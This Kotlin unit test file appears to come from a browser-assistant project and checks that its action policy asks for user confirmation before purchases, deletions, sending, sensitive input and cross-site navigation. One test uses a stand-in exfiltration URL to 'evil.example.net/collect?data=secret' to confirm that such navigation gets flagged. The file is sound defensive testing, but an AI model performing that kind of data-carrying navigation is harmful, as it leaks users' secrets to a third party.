package com.taskpilot.assistant.policy

import org.junit.Assert.assertEquals
import org.junit.Assert.assertFalse
import org.junit.Assert.assertTrue
import org.junit.Test

class ActionPolicyTest {

    private fun decide(action: BrowserAction, element: ElementInfo? = null, url: String = "https://shop.example.com/item/1", strict: Boolean = false) =
        ActionPolicy.evaluate(action, PolicyContext(url, element, strict))

    private fun riskOf(d: Decision): RiskKind? = (d as? Decision.Confirm)?.request?.risk

    private fun button(label: String, submit: Boolean = false, search: Boolean = false) =
        ElementInfo(id = "e1", tag = "button", type = if (submit) "submit" else "button", label = label, isSubmitControl = submit, inForm = submit, isSearchContext = search)

    private fun link(label: String, href: String) = ElementInfo(id = "e2", tag = "a", label = label, href = href)

    @Test
    fun passiveActionsNeverNeedConfirmation() {
        assertEquals(Decision.Allow, decide(BrowserAction.ReadPage(6000), strict = true))
        assertEquals(Decision.Allow, decide(BrowserAction.Scroll(ScrollDirection.DOWN), strict = true))
    }

    @Test
    fun ordinaryClicksAreAllowed() {
        assertEquals(Decision.Allow, decide(BrowserAction.Click("e2"), link("Next page", "https://shop.example.com/page/2")))
        assertEquals(Decision.Allow, decide(BrowserAction.Click("e1"), button("Show more")))
        assertEquals(Decision.Allow, decide(BrowserAction.Click("e2"), link("Sign in", "https://shop.example.com/login")))
        assertEquals(Decision.Allow, decide(BrowserAction.Click("e1"), button("Apply filters")))
        assertEquals(Decision.Allow, decide(BrowserAction.Click("e1"), button("Search", submit = true, search = true)))
    }

    @Test
    fun consequentialClicksNeedConfirmation() {
        assertEquals(RiskKind.PURCHASE, riskOf(decide(BrowserAction.Click("e1"), button("Place your order", submit = true))))
        assertEquals(RiskKind.PURCHASE, riskOf(decide(BrowserAction.Click("e1"), button("Buy now"))))
        assertEquals(RiskKind.PURCHASE, riskOf(decide(BrowserAction.Click("e1"), button("Continue"), url = "https://shop.example.com/checkout/step2")))
        assertEquals(RiskKind.DELETE, riskOf(decide(BrowserAction.Click("e1"), button("Delete account"))))
        assertEquals(RiskKind.DELETE, riskOf(decide(BrowserAction.Click("e2"), link("x", "https://mail.example.com/msg/delete?id=4"))))
        assertEquals(RiskKind.SEND, riskOf(decide(BrowserAction.Click("e1"), button("Send"))))
        assertEquals(RiskKind.SEND, riskOf(decide(BrowserAction.Click("e1"), button("Sign in", submit = true))))
        assertEquals(RiskKind.SUBMIT_FORM, riskOf(decide(BrowserAction.Click("e1"), button("Next", submit = true))))
    }

    @Test
    fun frenchAndArabicLabelsAreClassified() {
        assertEquals(RiskKind.PURCHASE, ActionPolicy.classifyLabel("Passer la commande"))
        assertEquals(RiskKind.DELETE, ActionPolicy.classifyLabel("Supprimer"))
        assertEquals(RiskKind.SEND, ActionPolicy.classifyLabel("Envoyer"))
        assertEquals(RiskKind.PURCHASE, ActionPolicy.classifyLabel("اشتر الآن"))
        assertEquals(RiskKind.DELETE, ActionPolicy.classifyLabel("حذف"))
        assertEquals(RiskKind.SEND, ActionPolicy.classifyLabel("إرسال"))
    }

    @Test
    fun wordBoundariesAvoidFalsePositives() {
        assertEquals(null, ActionPolicy.classifyLabel("PayPal help center"))
        assertEquals(null, ActionPolicy.classifyLabel("Reserved seating info"))
        assertEquals(null, ActionPolicy.classifyLabel("Posts"))
        assertEquals(RiskKind.DELETE, ActionPolicy.classifyLabel("Unsubscribe"))
        assertEquals(RiskKind.SEND, ActionPolicy.classifyLabel("Subscribe"))
    }

    @Test
    fun typingRules() {
        val search = ElementInfo(id = "e5", tag = "input", type = "search", label = "Search", inForm = true, isSearchContext = true)
        assertEquals(Decision.Allow, decide(BrowserAction.TypeText("e5", "rolling papers", true), search))

        val plain = ElementInfo(id = "e6", tag = "input", type = "text", label = "City")
        assertEquals(Decision.Allow, decide(BrowserAction.TypeText("e6", "Beirut", false), plain))
        assertEquals(RiskKind.SUBMIT_FORM, riskOf(decide(BrowserAction.TypeText("e6", "Beirut", true), plain.copy(inForm = true))))

        val password = ElementInfo(id = "e7", tag = "input", type = "password", label = "Password")
        val d = decide(BrowserAction.TypeText("e7", "hunter22", false), password)
        assertEquals(RiskKind.SENSITIVE_INPUT, riskOf(d))
        val shownText = (d as Decision.Confirm).request.details.first { it.first == "Text" }.second
        assertFalse("Password must be masked in the dialog", shownText.contains("hunter22"))

        val card = ElementInfo(id = "e8", tag = "input", type = "text", autocomplete = "cc-number", label = "Card")
        assertEquals(RiskKind.SENSITIVE_INPUT, riskOf(decide(BrowserAction.TypeText("e8", "4111", false), card)))

        val email = ElementInfo(id = "e9", tag = "input", type = "email", label = "Email")
        assertEquals(RiskKind.SEND, riskOf(decide(BrowserAction.TypeText("e9", "me@example.com", false), email)))

        val chat = ElementInfo(id = "e10", tag = "div", label = "Type a message", isContentEditable = true)
        assertEquals(RiskKind.SEND, riskOf(decide(BrowserAction.TypeText("e10", "hi", true), chat)))
    }

    @Test
    fun crossSiteNavigationWithDataNeedsConfirmation() {
        val exfil = BrowserAction.OpenUrl("https://evil.example.net/collect?data=secret", "evil.example.net")
        assertEquals(RiskKind.NAVIGATION_WITH_DATA, riskOf(decide(exfil, url = "https://bank.example.com/")))

        val sameSite = BrowserAction.OpenUrl("https://www.example.com/search?q=1", "www.example.com")
        assertEquals(Decision.Allow, decide(sameSite, url = "https://shop.example.com/"))

        val noData = BrowserAction.OpenUrl("https://news.example.org/today", "news.example.org")
        assertEquals(Decision.Allow, decide(noData))
    }

    @Test
    fun strictModeConfirmsActiveActions() {
        assertEquals(RiskKind.STRICT_MODE, riskOf(decide(BrowserAction.WebSearch("x"), strict = true)))
        assertEquals(RiskKind.STRICT_MODE, riskOf(decide(BrowserAction.GoBack, strict = true)))
        // A more serious reason wins over strict mode.
        assertEquals(RiskKind.PURCHASE, riskOf(decide(BrowserAction.Click("e1"), button("Pay now"), strict = true)))
    }

    @Test
    fun confirmationShowsSiteAndLabel() {
        val d = decide(BrowserAction.Click("e1"), button("Delete repository")) as Decision.Confirm
        assertTrue(d.request.details.contains("Website" to "shop.example.com"))
        assertTrue(d.request.details.any { it.second.contains("Delete repository") })
    }
}
